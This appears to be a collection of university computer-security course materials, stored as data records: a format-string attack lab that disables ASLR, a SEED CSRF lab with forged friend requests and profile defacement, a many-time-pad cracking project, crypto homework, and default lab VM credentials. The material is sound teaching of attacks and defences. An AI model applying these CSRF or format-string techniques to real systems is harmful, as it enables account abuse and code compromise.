This will open a new bash shell for you with ASLR disabled, including all child processes run from this 
shell. This means that when you are done with this part of the assignment, you should type exit to 
exit your shell to make sure there are no side effects.
So let’s put it all together and attack a format string vulnerability!
Compile the fmtStrVuln.c source code and then run two times to verify that the target address 
changes across different runs. Do not worry if there is a warning when you compile as it should 
successfully compile.
Q7: Provide a screenshot of the results for two normal runs of this program that includes your 
EUID to show that the target address changes between runs.
Temporarily disable ASLR for your shell with the following command:
$ setarch `uname -m` -R /bin/bash
Compile the fmtStrVuln.c source code file again and then run two times to verify that the target 
address now remains the same across different runs.
Q8: Provide a screenshot of the results for two normal runs of this program that includes your 
EUID to show that the target address stays the same between runs.
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
9 of        9
Now, knowing that the target address will remain the same across different runs in this shell, use 
command substitution to create a file called input that will be used to redirect input to your 
executable. A couple things to note:
a. You will need to determine whether our system is running 32-bit or 64-bit as well as whether 
the byte order is big endian or little endian. You may refer to the lab section for the buffer 
overflow problem for details on this. The results will determine how you will create the target 
address used in the command substitution.
b. You will have to use trial and error to determine how many %x’s are needed.
Q9: Provide a screenshot of the bash statement used to create the input file that includes your 
EUID. Then display the contents of the input file using the more command all in the same 
screenshot.
Finally, show your format string vulnerability attack here, but be sure that the target address data 
changes to some new value from the original 0x11223344.
Q10:Provide a screenshot of the program execution using input redirection with the input file 
that includes your EUID. Be sure that the target address data value was changed!
Be sure to exit your shell that temporarily disabled ASLR when done!"
"['prompt customization manual', 'customization manual', 'command prompt customization', 'command prompt', 'euid', 'prompt customization', 'command', 'prompt', 'manual', 'snapshot', 'customization', 'enterprise userid', 'hostname', 'restore', 'actual euid', 'set-hostname euid', 'hostnamectl set-hostname euid', 'customization steps', 'virtualbox', 'enterprise', 'restore the snapshot', 'hosts', 'prompt by setting', 'open', 'terminal']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Command Prompt,Lab,"Command Prompt Customization Manual
You will customize the command prompt by setting the hostname as your EUID (Enterprise UserID). 
Customization steps:
1. Login to with your regular credentials.
2. First, set the hostname: open the terminal window and type the below command, where “EUID” 
must be replaced with your actual EUID. (You will be prompted the root password; remember 
that it is the same as that of the normal user.)
sudo hostnamectl set-hostname EUID
3. Close the terminal, open it again and confirm that in the command prompt, the hostname is 
now the same as your EUID.
4. Next, update the /etc/hosts file: type the following command:
sudo nano /etc/hosts
Then, replace the old hostname with your EUID. Save the file and exit.
Reference: https://phoenixnap.com/kb/ubuntu-20-04-change-hostname
General recommendation: You may consider creating a backup of the VM image after making these 
customization changes, so that you can restore the snapshot in the event something goes wrong during 
the lab. For that in VirtualBox, click the Machine menu, then click Take Snapshot (or Host+T). 
When you close the VM window (by clicking on the “x” button), VirtualBox will ask if you want to restore 
to the snapshot you saved. You can also manually restore the snapshot from VirtualBox, by clicking on 
the three dot/line menu for the VM, then Snapshots, then right-click on the snapshot ® Restore."
"['computer security fall', 'security fall', 'computer security', 'eve', 'csce', 'introduction', 'fall', 'security', 'computer', 'alice', 'question', 'points', 'tmp', 'linux', 'introduction to computer', 'explain', 'password', 'assume', 'attack', 'find', 'computers', 'alice ’s computer', 'eve injects', 'classify', 'eve returns']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Computer Security,Homework,"CSCE 5550 – Introduction to Computer Security 
Fall 2022
Homework 1
Question 1 (25 points): Classify each of the following as a violation of confidentiality, or 
integrity, or availability, and other concerns and explain why:
1. Eve injects a ransomware to Alice’s computer. Alice pays the ransom and Eve returns an 
incorrect key. 
2. Alice, Bob, and Eve are using the same computer with no administrative privileges. 
Somehow, Eve’s executable can take root actions and deletes the user files and corrupts 
the system files. 
3. Alice’s computer at home can no longer access network, even though all other computers
can access. When she monitors the network traffic, she sees large amount of traffic from 
Eve’s computer. Eve rejects that she has anything to do with it. 
Question 2 (20 points): Assume that you are trying to find out your forgotten password. Explain 
how you can find out the password using brute-force attack and dictionary attack. Explain how 
much time they would require breaking the password (assume that your computer can try 1,000
passwords in a second). And you assume that your password had 8 alphanumeric characters. 
Question 4 (15 points): Explain the followings: 
- What are the key differences between Unix and Linux? 
- What are the following directories used for in Linux? /etc/, /tmp/, /root/, / 
- What happens when you create the following directories in Linux, would it give an error, 
why? /tmp/my+dir, /tmp/MyDir, /tmp/mydir
Question 5 (40 points): Find three big cybersecurity attacks that happened after 2021 (including 
2021). For each attack what vulnerability has been exploited, how the attack worked (i.e., how 
bit it was, how many computers were used, etc.), how it was mitigated. And apply STRIDE and 
DREAD for each of them. "
"['csrf attack', 'web console network', 'web console', 'alice', 'cross-site request forgery', 'request', 'csrf', 'boby', 'attack lab', 'request forgery', 'attack', 'lab', 'csrf attacks', 'http requests', 'click', 'http post request', 'cross-site request', 'console network tab', 'euid', 'web', 'csrf request', 'attach a screenshot', 'console', 'console network', 'elgg']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Cross-Site Rqst Forgery,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
Lab 6:
Cross-Site Request Forgery (CSRF) 
Attack Lab
This lab will be based on the SEED Lab
(https://seedsecuritylabs.org/Labs_16.04/Web/Web_CSRF_Elgg/), 
which uses the SEEDUbuntu-16.04-32bit VM (https://seedsecuritylabs.org/lab_env.html). 
See https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf 
for the manual on importing the SEEDUbuntu VM into VirtualBox. 
Follow the 7 steps in “How to Use Virtualbox to Run SEEDUbuntu VM”. 
For this lab, you do not need to configure the network (as explained in the Appendix B). 
In VirtualBox, for the SEED Ubuntu VM, click in the menu Machine ® Settings…, 
“Network” section, in “Attached to”, set “NAT”.
This document contains customizations, questions, and additional instructions specific to 
how this SEED lab is conducted for this course.
NOTE: Before running this lab, you must read the original SEED lab description:
https://seedsecuritylabs.org/Labs_16.04/PDF/Web_CSRF_Elgg.pdf
and also, you may consider having this description opened in another window.
(Ignore Sec. 4.1 of that description as we will not use the HTTP Header Live 
add-on.)
IMPORTANT NOTES:
• URLs (www.csrflabelgg.com and www.csrflabattacker.com) in the below tasks 
should only be accessed from inside of the SEEDUbuntu-16.04-32bit VM. 
• The /etc/hosts file is modified to map the domain name of each URL 
to the virtual machine’s local IP address (127.0.0.1).
• Make sure to use the website names EXACTLY as they are shown above, 
otherwise you may get the wrong website. 
• DO NOT access these URLs from your host machine or from other VM’s
as the actual Internet domains are not controlled by UNT.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your 
command prompt as described in the Command Prompt Customization Manual.
This customization manual directs you to place your EUID (Enterprise User ID) 
into the command prompt. Submissions which do not comply with this requirement 
will receive no credit.
IMPORTANT NOTE: This lab contains additional customizations. 
In several places, you must add your EUID such that it will appear on 
the screenshots. Submissions which do not comply with this requirement will 
receive no credit.
Task 1: Observing HTTP Requests
In Cross-Site Request Forget attacks, we need to forge HTTP requests. Therefore, we need to know 
what a legitimate HTTP request looks like and what parameters it uses. We will use Firefox’s Web 
Console for this purpose. In this task, we will capture an HTTP GET request and an HTTP POST 
request in Elgg.
1. Start the Firefox Browser and open the “Network” tab of the Web Console: 
Tools ® Web Developer ® Network. Click “HTML” and “XHR” buttons in the console.
This way, only relevant requests will be displayed.
2. Access the website (http://www.csrflabelgg.com/) in Firefox. Do not login.
3. Use the Web Console’s “Network” tab to observe an HTTP GET request for the website 
(http://www.csrflabelgg.com/). Note that you can change the size of the Web Console by 
moving its upper border according to your convenience.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
Note: You need to reload the webpage to see the request, if you opened the Web Console after 
accessing the webpage. To see the parameters, use the “Params” tab on the right.
Q1: Attach a screenshot of the result. What parameters were used in this request (if any)?
4. Login to the website (http://www.csrflabelgg.com/) as Charlie (username: charlie, 
password: seedcharlie). Do not close the Web Console.
5. Use the Web Console’s “Network” tab to observe an HTTP POST request for 
(http://www.csrflabelgg.com/). Do not close the Web Console.
Q2: Attach a screenshot of the result. What parameters were used in this request (if any)?
Task 2: CSRF Attack with GET Request
In this task, we consider two people in the Elgg social network: Alice and Boby. Boby wants to become 
a friend to Alice, but Alice refuses to add him to her Elgg friend list. Boby decides to use the CSRF 
attack to achieve his goal. He sends Alice an URL (via an email or a posting in Elgg); Alice, curious 
about it, clicks on the URL, which leads her to Boby’s website: (www.csrflabattacker.com). As Boby, 
you will construct the content of this website, so that as soon as Alice visits the web page, Boby is 
added to the friend list of Alice (assuming that Alice has an active session with Elgg).
To add a friend to the victim, we need to identify what the legitimate HTTP request (a GET request) for 
adding friends looks like. We will use the Web Console (as in the previous task) to do the investigation. 
Note that in this task, you are not allowed to write JavaScript code to launch the CSRF attack. 
First, let us investigate the legitimate HTTP requests by adding friends when working as a user Charlie, 
and comparing the results.
6. Make sure that you are logged in as Charlie (username: charlie, password: seedcharlie).
Click on “More” ® “Members”. Click on Alice’s name.
Make sure that the Web Console Network tab is open so that you can see the request you are 
about to make. 
Click on “Add Friend” (the button on the left).
Q3: Attach a screenshot of the details of the “Add Friend” request to add Alice as one of 
Charlie’s friends. What parameters are sent in this request? 
What URL is the request being sent to?
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
7. Go back to the “Members” list. Click on “Boby”.
Make sure that the Web Console Network tab is open so that you can see the request you are 
about to make.
Click on “Add Friend” (the button on the left).
Q4: Attach a screenshot of the details of the “Add Friend” request to add Boby as one of 
Charlie’s friends. What parameters are sent in this request?
Next, you need to consider how the results of the above experiments help Boby to craft a CSRF request 
to add Alice as a friend even though she does not want to become his friend.
Consider the index page of Boby’s attacking website (www.csrflabattacker.com).
Q5: What URL (i.e., CSRF request) should this page contain for Boby’s attack to succeed?
NOTE: In the “Add Friend” HTTP requests, you may notice that each request includes two parameters, 
__elgg_ts and __elgg_token. They are used as a countermeasure against CSRF attacks. Specifically, if 
these parameters do not contain correct values, the request will not be accepted by Elgg. We have 
disabled the countermeasure for this lab, so there is no need to include these two parameters in 
the CSRF requests. In particular, there is no need to include these two parameters into your answer to 
the above question.
8. Create an index.html file inside the attacker’s website 
(www.csrflabattacker.com; /var/www/CSRF/attacker folder). 
Design this page so that anyone with an active Elgg session that visits the page will 
automatically become Boby’s friend whether that person wants to or not. 
Notes: This page should achieve the stated goal without using any JavaScript.
Moreover, the attack should work as soon as Alice visits the index page, without even making 
any clicks on it.
Customization: The index page MUST contain your EUID somewhere in the visible text. 
Hint for the attack: The “img” tag automatically triggers an HTTP GET request whether the image 
exists or not.
NOTE: Create a backup copy of this file because you will need to overwrite and then restore this 
file in later steps.
Q6: Attach the source code for the attacker’s index.html file.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
Next, Boby will send a message to Alice with a link to his attacking website. We will assume that Alice 
is not careful (maybe, she did not take CSCE 5550 course :-), so she will click on the link.
9. Log in as Boby (http://www.csrflabelgg.com/, username: boby, password: seedboby).
Go to the “Members” list. Click on “Alice”.
Q7: Attach a screenshot proving that Alice is not friends with Boby.
10. Click on “Send a message”.
Send a message to Alice with a link to the www.csrflabattacker.com website.
Customization: The message MUST contain your EUID somewhere in the visible text.
Note: The message subject must be non-empty, otherwise the website will throw 
an error. (This is an unintentional bug in the website implementation.)
11. Log in as Alice. Click on the envelope to view your messages.
Q8: Attach a screenshot of the message that you sent to Alice. 
Make sure that it includes your EUID and a link to the www.csrflabattacker.com website.
12. Click on the link in Boby’s message.
Q9: Attach a screenshot of how the webpage looks when Alice views it.
13. Go back to www.csrflabelgg.com in your browser.
Q10: Attach a screenshot of the result.
Task 3: CSRF Attack Using POST Request
In this part of the lab, Bob will run another CSRF attack with a goal to deface Alice’s profile so that it
reads “Boby and ${Your_EUID} are MY HEROES!!” (replace ${Your_EUID} with your actual
EUID). 
14. Log in as Alice (http://www.csrflabelgg.com/, username: alice, password: seedalice).
15. Click on “Edit profile”.
16. Open the Web Console Network tab so that you can see the request you are about to make. 
Fill out the form with some information (this information can be arbitrary) and click “Save”.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
Q11: Attach a screenshot of the details of the request to update Alice’s profile. 
Remember that Boby wants to run a CSRF attack to deface Alice’s profile so that it reads “Boby 
and ${Your_EUID} are MY HEROES!!”. (Replace ${Your_EUID} with your actual EUID.)
Q12: What parameters will Boby need to pass for such the CSRF attack to succeed? 
How must he pass them?
17. Edit the index.html file inside the attacker’s website (www.csrflabattacker.com; 
/var/www/CSRF/attacker folder) so that the page will launch a CSRF attack to deface Alice’s 
profile to read “Boby and ${ Your_EUID} are MY HEROES!!”.
(Replace ${Your_EUID} with your actual EUID.)
Hint: A sample code that you can modify is given in the original SEED lab.
(The use of Javascript is allowed in this task. The sample code uses it.)
NOTE: Create a backup copy of this version of the file because you will need to overwrite and 
then restore this file in later steps.
Q13: Attach the contents of the attacker’s index.html file.
18. Log in as Boby and send another message to Alice with the link to the attacker’s webpage 
that you created above.
Customization: The message MUST contain your EUID somewhere in the visible text.
19. Log in as Alice and click on “My Profile”.
Q14: Attach a screenshot of Alice’s profile at this point.
20. Click on the envelope to view the messages.
Q15: Send a screenshot of the message with the link.
Make sure it includes your EUID and a link to the www.csrflabattacker.com website.
21. Open the Web Console Network tab so that you can see the request, which you are about to 
make.
22. Then, click on the link in the message to launch the attacker’s webpage. 
Q16: Attach a screenshot of the network traffic and a screenshot of the result. 
Describe what happened.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
Q17: This attack requires Alice’s user ID in order to work. 
Describe how Boby can find out Alice’s user ID. 
Suppose that Boby now wants to modify the CSRF attack so that he can deface the Elgg profiles of any 
Elgg user that goes to Boby’s site.
Q18: Can he do this? If so, how? If not, why not? 
Task 4: Implementing a Countermeasure for Elgg
Enable the Countermeasure
23. Go to the /var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg directory.
In the “ActionsService.php” file, find the “gatekeeper” function. 
Comment out the “return true;” at the top of this function.
Undo the Previous CSRF Attacks
24. Log in as Alice. 
25. Click on the second-to-the-left icon (“Friends”) on the top (black) bar. 
If Boby is here, click on Boby and click “Remove friend”.
26. Click on the leftmost icon (“Profile”) on the top (black) bar. 
Click on “Edit profile” and undo the results of the CSRF attack on the profile.
Repeat the CSRF Attacks Again
27. Restore the attacker’s “index.html” file from Task 2. 
28. Log in as Alice, go to the message from Boby with the link, and click on the link.
29. Then, go back to the www.csrflabelgg.com website.
Q19: Describe what happens when you try to repeat the attack from Task 2.
Why does this happen? Attach a screenshot if you can.
30. Restore the attacker’s “index.html” file from Task 3. 
31. Log in as Alice, go to the message from Boby with the link, and click on the link.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cross-Site Request Forgery (CSRF) Attack Lab
Q20: Describe what happens when you try to repeat the attack from Task 3. 
Why does this happen? Provide a screenshot if you can."
"['key', 'united states', 'document in canvas', 'text document', 'organization', 'key cryptosystem', 'cipher', 'suppose', 'time', 'decrypt', 'cryptosystem', 'password', 'symmetric key cryptosystem', 'united states overcome', 'message', 'letter', 'long', 'united', 'affine cipher', 'ciphertext', 'states', 'decipher sfcxzy nsjfuw', 'keys', 'language', 'homework']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Cryptography 1,Homework,"Homework 6
Due: 11:59 PM on Monday, April 11, 2022
Form of submission: PDF, Word, or Text Document in Canvas

⦁        Suppose a top-secret organization has 5,000 employees, all of whom need to communicate with every other employee in the organization.
⦁        How many keys are needed if the organization used a symmetric key cryptosystem where two users use a single shared secret key to communicate with each other?



⦁        How many keys are needed if the organization used an asymmetric, or public, key cryptosystem where each user has a public key and a private key?



⦁        Calculate the timing of password-guessing attacks:
(a)        If passwords are three uppercase alphabetic characters long, how much time would it take to determine a particular password, assuming that testing an individual password requires 5 seconds? How much time if testing requires 0.001 seconds?



(b)        Argue for a particular amount of time as the starting point for “secure.” That is, suppose an attacker plans to use a brute-force attack to determine a password. For what value of x (the total amount of time to try as many passwords as necessary) would the attacker find this attack prohibitively long?



⦁        What are the risks of having the US government select a cryptosystem for widespread commercial use (both inside and outside the United States)? How could users from outside the United States overcome some or all of these risks?




⦁        An affine cipher is a generalization of the Caesar cipher and has the following form: , where x is the plaintext letter and  is the ciphertext letter. Now, assume that a ciphertext has been generated using an affine cipher where the first and second most frequent letter in the ciphertext are ‘B’ and ‘U’, respectively. Use the given information and what we’ve covered in class to break this code! Hint: You are being asked to solve for a and b using a system of linear equations and there is some trial and error in these calculations!





⦁        Consider a block cipher that has a block size of 4 bits, where each block can be written as a single hexadecimal digit. Now suppose an encryption function for a particular key  is given in the following table:
 
Decrypt the following messages that were encrypted using  using the following modes of operation:
⦁        ECB mode:  c994f88



⦁        CBC mode with initialization vector = b: 144f




⦁        Consider a language with only three letters, x, y, and z. Now suppose that you intercept a very long message in this language and discover the average frequencies for x, y, and z to be 0.6, 0.3, and 0.1, respectively. Based on your observations, what is the index of coincidence for this language?




⦁        In DES, find the output (in hex) of the initial permutation box when the input is given in hexadecimal as: 0xFF00 0000 0000 0000




⦁        Decipher SFCXZY NSJFUW SMKEYY that was enciphered using the Vigenère method with the keyword SURE.




⦁        Decrypt the following message that was encrypted using a rail-fence cipher:
TSWILWLALPYIDVEAPIRDOARLTNIRTITOIEIIHIDSIHHWSDMRTEULOSTEMAHANH
Note that you are not given the key (i.e., number of rows), so you will have to use some trial-and-error to decrypt this message, but start with at least 4 rows.




⦁        Given the S-Box below, use the DES S-Box Rule that results in a 4-bit output for a given 6-bit input  to compute . Be sure to give your answer in 4-bit binary representation.
 
⦁                 


⦁                 

"
"['ciphertexts', 'one-time pad', 'pad', 'set of ciphertexts', 'foundations of cybersecurity', 'characters', 'sample output', 'cybersecurity spring', 'set', 'one-time', 'decrypt', 'space', 'ascii character set', 'many-time pad', 'project', 'program', 'character', 'plaintexts', 'ciphertext', 'xor', 'ascii', 'spring', 'time pad', 'messages', 'hexadecimal one-time pad']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Cryptography 2,Project,"CSCE 3550 Foundations of Cybersecurity Spring 2022
1
Project 2
Due: 11:59 PM on Monday, April 18, 2022
PROJECT BACKGROUND:
In the lectures, we have said that we should never reuse a one-time pad to encrypt multiple messages. If 
the same one-time pad (i.e., key) is used more than once, you can apply some techniques to exploit the 
vulnerability and crack the ciphertext! Consider the following:
�! = �!⨁�
�"" = �""⨁�
�!⨁�"" = �!⨁�⨁�""⨁� = �!⨁�""
Since XOR is commutative, we eliminate �⨁� = 0 and end up with an XOR of the two plaintexts. Since 
our plaintexts are made up of only letters (both upper- and lowercase) and spaces, we can build the 
following table of what happens when two characters are XOR’ed together using the ASCII encoding:
⨁ A – Z (65 – 90) a – z (97 – 122) Space (32)
A – Z (65 – 90) ≤ 32 ≤ 64 ≥ 65
a – z (97 – 122) ≤ 64 ≤ 32 ≥ 65
Space (32) ≥ 65 ≥ 65 0
If you look closely at this table, this means that when XOR’ing a space with any of the upper- or 
lowercase letters an ASCII value ≥ 65 is obtained. And that is the only case when this will happen! So,
what does this mean and how can we use this? Let’s see with an example. Suppose you have the 
following three plaintexts:
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
�� A t t a c k n o w
�� W i t h d r a w t o m o r r o w
�� C o m e t o d a y
Suppose that you know they have been encrypted with the same one-time pad as ours has been. Then, we 
do not need to consider the key � as we can make it vanish when used more than once. Take a look at the 
7th column (under the 6 heading). What happens when we XOR �&[6] with �![6] and �""[6]? As 
expected, we get:
�&[6]⨁�![6] = �&[6]⨁�![6] = 65
�&[6]⨁�""[6] = �&[6]⨁�""[6] = 79
CSCE 3550 Foundations of Cybersecurity Spring 2022
2
Now with some confidence, we can assert that �&[6] is a space since both values are 
≥ 65, though more checks may need to be done to be sure. But now since �&[6]⨁�![6] is known, we 
can easily recover �![6] as well since having �&[6] and �&[6] means we have the key �[6] that can 
decrypt each letter in all the ciphertexts in this position. If we intercept enough ciphertexts that are 
encoded with the same one-time pad key, it is very likely that there will be enough spaces spread 
throughout all of the columns that will provide a fair amount of decryption.
PROGRAM DESCRIPTION:
For this project, you will write a program in any programming language supported on our Linux CSE 
machines that will decrypt as much of the ciphertexts as possible that are created using a many-time pad 
based on the technique to exploit the many-time pad vulnerability described above. This will involve 
reading in the file appropriately (i.e., using two hexadecimal values for each encrypted character) and 
then applying these techniques to decrypt the ciphertexts. These ciphertexts are generated using bitwise 
exclusive-or (XOR) with the one-time pad (actually, a many-time pad). For example, the ASCII value for 
the character 'H' is hexadecimal value 0x48 (or 01001000 in binary), which when XOR’ed with the 
hexadecimal one-time pad value 0xda (or 11011010 in binary) gives the hexadecimal ciphertext 0x92
(or 10010010 in binary). The resulting plaintexts are really just English sentences encoded in the 
standard ASCII character set.
You may assume that you have three or more ciphertexts per many-time pad, each with 60 characters
expressed using their hexadecimal ASCII values (i.e., 2 hexadecimal values or 8 bits). The one-time pad 
used to create each ciphertext is exactly the length of the plaintext message (in bytes, that is, 120 bytes).
Also, the original plaintexts contain only upper- and lowercase alphabetic characters with spaces (i.e., no 
special characters or punctuation).
To help you with testing, you will be provided with the two Python programs that were created to 
generate the ciphertexts used in the SAMPLE OUTPUT, but please note that your ciphertexts will be 
different each time you run these programs as they are uniquely and randomly created with each 
execution. You may use these programs also to create your own ciphertexts and test out various scenarios.
Your goal will be to decrypt as much of the ciphertexts as possible, noting that the probability of being 
able to decrypt more of the ciphertexts increases with the number of plaintexts encrypted with the same 
one-time pad. For example, in the SAMPLE OUTPUT, only 37 of the 60 characters were able to be 
decrypted in the first set of ciphertexts because the one-time pad was re-used only four times (i.e., five 
messages) times while in the second set of ciphertexts, 51 of the 60 characters were able to be decrypted 
since the one-time pad was re-used ten times (i.e., eleven messages). This is because there were more 
spaces on the individual columns of the 60 characters in each ciphertext.
You are only asked to decrypt 90% of the possible characters that can be decrypted of the 60-character set 
of ciphertexts using the ""space"" technique described above. This means, for example, that in the first 
given set of ciphertexts in the SAMPLE OUTPUT, you are only required to decrypt 33 characters on each 
line of the set of ciphertexts (since 37 columns of the first set of ciphertexts contain at least one space, and 
37 * 0.9 = 33.3), but in the second set of ciphertexts, you are required to decrypt 45 characters on each 
line of the set of ciphertexts (since 51 columns of the second set of ciphertexts contain at least one space, 
and 51 * 0.9 = 45.9). However, decrypting more than the 90% of the possible characters using the ""space""
technique will earn an additional 0.5% for each additional percentage of the ciphertexts that are 
CSCE 3550 Foundations of Cybersecurity Spring 2022
3
decrypted, up to a total of 105% for this project, but incorrect decryptions will result in a reduction of 
marks. For each column you are unable to decrypt, you will simply insert a '_' character instead of the still 
encrypted character (which may be a control or unprintable character).
REQUIREMENTS
• Your code should be well documented in terms of comments. For example, good comments in 
general consist of a header (with your name, course section, date, and a brief description), comments 
for each variable, and commented “blocks” of code.
• Your program will be graded largely on whether it works correctly on the CSE machines (e.g., 
cse01, cse02, …, cse06), so you should make sure that your program compiles and runs on a 
CSE machine.
• Your program should work with any set of ciphertexts created using the given Python program, where 
you may assume a minimum of three plaintexts encrypted with the program, but may include more.
• This is an individual programming assignment that must be the sole work of the individual student. 
Any instance of academic dishonesty will result in a grade of ""F"" for the course, along with a report 
filed into the Academic Integrity Database.
SAMPLE OUTPUT
$ more plaintexts1
One time pad is really a completely unbreakable cryptosystem
Encrypt and decrypt functions are each just an XOR operation
Key needs to be random bitstring with same length as message
A many time pad is very insecure and can be broken with ease
If you can decipher this you can see just how insecure it is
$ more ciphertexts1
43f591a7b0c5d04023d1e1ae2c584b79feee09caae701eba633d33c92542306e1c1a2e5cfaffa
6298ab85603a747d2e8a79d0d2ff2a3dab5a3bfda59
49f597f5bddcc90562cfe4ea68545b2bf5fb1c86a47c50b8373733ca260e34681c56321decf9e
4319aaa4942a44597908bbd5430f6a9dbada4a2d05a
47fe8da7aac9d8417081f4a52c535d79feea06c2ad641eb92a2a2fd027473b7d59013e08e7b1b
73a82bc1d0ea045d0bcaccf152ca6a1ccbfa3aad851
4dbb99e6aad59d516acce5ea7c505c79e5f848d0a77b47fb2a302fc1365b277f59173918aff2a
535cfbb5842a759d8a3a1815428efb8c1ecb5aacc51
45fdd4feabd99d4662cfa0ae69525129e4ee1a86b66157a8632733d1754d347459053219affbb
1289bf9550db20bdea6b78a172af4a989a5a4ebd647
$ ./a.out
Enter the name of the ciphertexts file: ciphertexts1
Plaintext Messages:
_ne __me pad __ __al__ a ___pl__el_ unb_eaka_le _ry_t_sy_t__
_ncr__t and d__r__t __nct___s __e _ach _ust _n X_R _p_ra_i__
_ey __eds to __ __nd__ bi___ri__ w_th s_me l_ngt_ a_ _es_a__
_ ma__ time p__ __ v__y i___cu__ a_d ca_ be _rok_n _i_h _a__
_f y__ can de__p__r __is ___ c__ s_e ju_t ho_ in_ec_r_ i_ __
$ more plaintexts2
It was the best of times it was the worst of times it was th
e age of wisdom it was the age of foolishness it was the epo
ch of belief it was the epoch of incredulity it was the seas
on of Light it was the season of Darkness it was the spring 
of hope it was the winter of despair we had everything befor
e us we had nothing before us we were all going direct to He
aven we were all going direct the other way in short the per
CSCE 3550 Foundations of Cybersecurity Spring 2022
4
iod was so far like the present period that some of its nois
iest authorities insisted on its being received for good or 
for evil in the superlative degree of comparison only The op
ening paragraph from A Tale Of Two Cities by Charles Dickens
$ more ciphertexts2
ddbf8602f1f5d396cff2a6eba3f6576b17adc31fe4fb41a161684feffb88b0175c7ca13d6dc6c
3ec9f96e90b4605e93d4b4e74fab141a047b997b0b4
f1ebc712f5a69c8487e0effaa2ea4e6b11bfc31cece504a629641baeeb8ce3584e34a27275c5d
8ec83d8e31e1551e9240e4a35e0e515bf43ead2b4b3
f7a3861af6a69187cbfee3efe6ec576b0faa904bf9fe41f2247154ace4c9ac51087daa7e68ccd
5ea87dff2144618f470595c27b3b109b206b9d2a5af
fba5861af6a6bf8bc0fff2a9aff1033c19b8c31fe5f304a1246048a0e2c9ac510850a56f71c7d
4ec9896ef194606e1230e493cf6e512a754a3d9a3fc
fbad861dfff696c2cee3a6fea7f6033f10aec31ce4f850b7332154a9ac8da6445875ad6f3aded
4bf83d7e24d0307e52257493cfaab06f744afd1abae
f1ebd306b0f196c2cff6e2a9a8ea572311a5844beff342bd33641bbaffc9b4520863a16f7f89d
0f38796e1020f1fe7704a5426f6a615f752a5978cb9
f5bdc31bb0f196c2d0f2f4ece6e44f2758ac8c02e3f104b628735eacf8c9b75f4d34ab6972ccc
3bf9cd7ff4d0f1fa023465226e7e515bf43eac7a1ae
fda4c255e7e780c2d4f8a6efa7f7032711a0864bf9fe41f231735ebce987b7175871b67475cd9
1eb83d7f24d151eed350e5232b3ac15a406a4d8adaf
fdaed501b0e78696cff8f4e0b2ec463858a28d18e4e550b7252154a1ac80b7440876a17474ce9
1ed8ed5e3041014e470485226b3a20eb842ead8b6fc
f2a4d455f5f09a8e87fee8a9b2ed466b0bbe930efffa45a628775eefe88ca4454d71e4727c89d
2f086c6e71f0f02ef3e0e523affbc41834eaf97abac
f1a5cf1bf7a68383d5f6e1fba7f54b6b1eb98c06add70486206d5eefc38fe3635f7be45e73ddd
8fa9896e4144632e8315c5131e0e525be45a1d2aaaf
$ ./a.out
Enter the name of the ciphertexts file: ciphertexts2
Plaintext Messages:
_t was th_ be_t o_ ti_es it was the wors_ _f time_ it was _h
_ age of _isd_m i_ wa_ the age of foolis_n_ss it _as the e_o
_h of bel_ef _t w_s t_e epoch of incredu_i_y it w_s the se_s
_n of Lig_t i_ wa_ th_ season of Darknes_ _t was _he sprin_ 
_f hope i_ wa_ th_ wi_ter of despair we _a_ every_hing bef_r
_ us we h_d n_thi_g b_fore us we were al_ _oing d_rect to _e
_ven we w_re _ll _oin_ direct the other _a_ in sh_rt the p_r
_od was s_ fa_ li_e t_e present period t_a_ some _f its no_s
_est auth_rit_es _nsi_ted on its being r_c_ived f_r good o_ 
_or evil _n t_e s_per_ative degree of co_p_rison _nly The _p
_ning par_gra_h f_om _ Tale Of Two Citie_ _y Char_es Dicke_s
SUBMISSION
• You will electronically submit all of your source code files, makefile, if applicable, plus a 
README file with any important compiling/running instructions for the TA to the Project 2
dropbox in Canvas by the due date.
• Note that the dates on your electronic submission will be used to verify that you met the due date 
above. Projects submitted late up to 1 day (i.e., 24 hours) will receive a 30% grade penalty. Later 
submissions will receive zero credit, so hand in your best effort on the due date.
• The work submitted for this project must be your own work and done individually. Evidence to the 
contrary will receive a “0” for this project and may result in further disciplinary action.
• If you have any questions or concerns about what is expected in this project, please contact your 
instructor."
"['openssl', 'key', 'public key', 'attach a screenshot', 'note', 'ova file cscelab.ova', 'pass pass', 'attach', 'euid', 'rsa', 'pass', 'public key certificates', 'openssl enc', 'type', 'public', 'ssh', 'rsa private key', 'cscelab.ova on canvas', 'result', 'password', 'plaintext.txt', 'ova file', 'screenshot', 'encryption', 'private key']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Cryptography 3,Lab,"Lab 5a: Cryptography

This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. The credentials are as follows: 
username: sec-lab
password: untccdc

Section 1: Symmetric Encryption using OpenSSL
The learning objective of this lab is for students to get familiar with the concepts in the secret key encryption. After finishing the lab, students should be able to gain a first-hand experience on encryption algorithms and their modes of operation. We will study tools and libraries for providing data confidentiality.

